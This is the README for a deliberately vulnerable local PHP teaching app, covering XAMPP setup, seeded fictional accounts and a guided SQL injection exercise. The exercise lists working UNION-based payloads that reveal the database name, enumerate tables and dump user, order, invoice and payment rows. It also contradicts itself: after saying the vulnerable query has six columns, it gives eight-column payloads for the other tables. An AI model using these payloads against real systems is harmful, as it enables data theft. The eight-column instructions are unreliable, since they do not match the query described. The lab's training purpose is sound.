# Cipher Veda Local Setup

## Requirements

- XAMPP Apache
- XAMPP MySQL or MariaDB
- PHP with PDO MySQL enabled

## Database

1. Start Apache and MySQL in the XAMPP control panel.
2. Open a terminal in `C:\xampp\htdocs`.
3. Import the schema and seed records:

```powershell
Get-Content -Raw database\schema.sql | & C:\xampp\mysql\bin\mysql.exe -u root
```

The default connection expects host `127.0.0.1`, database `cipher_veda`, user `root`, and an empty password. Change these values in `config.php` when the local MariaDB account differs.

To add varied fictional cart and purchase activity without resetting the database:

```powershell
Get-Content -Raw database\factory_activity.sql | & C:\xampp\mysql\bin\mysql.exe -u root
```

## Teaching mode

The local teaching build enables the vulnerable exercises together. No environment variable or configuration change is required between exercises. OTP token manipulation, checkout parameter tampering, profile ID tampering, and public search SQLi are available at the same time.

## Entry points

Open `http://localhost/` for the public site. Registration is available from the login page. Login accepts one of the seeded email addresses or mobile numbers:

- `rahul.sharma@example.com`
- `ananya.reddy@example.com`
- `vikram.rao@example.com`

Additional seeded accounts include `meera.nair@example.com`, `arjun.mehta@example.com`, and `sana.kapoor@example.com`.

The public search is available from the top navigation on every page. The browser form submits to `search.php`, while live results request `search_api.php?q=...`. In Burp Suite, inspect the search form or the browser Network panel to discover the API path before replaying the request.

## Compact SQLi exercise

Use only the local XAMPP application. The public search is the intentionally vulnerable surface.

1. Search for `platform`, then inspect Burp HTTP history to discover:

```text
GET /search_api.php?q=platform
```

2. Confirm boolean SQLi by changing `q` to:

```text
' OR 1=1-- -
```

3. Confirm the six-column UNION shape:

```text
x' UNION SELECT 1,'A','B','C','D',6-- -
```

4. Read the database name and DB account:

```text
x' UNION SELECT 0,DATABASE(),CURRENT_USER(),'m','Cipher Veda',0-- -
```

5. Enumerate application tables:

```text
x' UNION SELECT 0,table_name,'t','cipher_veda','',0 FROM information_schema.tables WHERE table_schema=DATABASE()-- -
```

6. Read fictional application users:

```text
x' UNION SELECT id,email,name,company,plan,0 FROM users-- -
```

The vulnerable product query exposes six columns: `id`, `sku`, `name`, `category`, `description`, and `price`. Use six-column projections for the other tables:

```text
x' UNION SELECT id,email,name,company,plan,0 FROM users-- -
```

For the other application tables, use eight-column projections:

```text
x' UNION SELECT id,sku,name,category,description,price,active,created_at FROM products-- -
x' UNION SELECT id,order_number,status,currency,subtotal,total,client_total,created_at FROM orders-- -
x' UNION SELECT id,product_name,quantity,unit_price,line_total,order_id,product_id,NULL FROM order_items-- -
x' UNION SELECT id,invoice_number,status,amount,user_id,order_id,issued_at,NULL FROM invoices-- -
x' UNION SELECT id,transaction_id,status,amount,currency,method,order_id,created_at FROM payment_attempts-- -
```

Use URL encoding when sending payloads. The database contains fictional lab data and no password table.

The OTP delivery channel is intentionally local-only. Codes are written to the PHP/Apache error log for repeatable classroom use, while the `otp_token` scenario includes a fresh challenge artifact in the verification request. For an operational authentication deployment, connect the challenge creation step to an approved email or SMS provider rather than displaying or logging codes.

## Checkout flow

The application uses ordinary browser transitions for product selection, cart, details, delivery, review, payment gateway submission, callback, and invoice creation. Completed records are stored in `orders`, `payment_attempts`, `invoices`, and `order_items`.
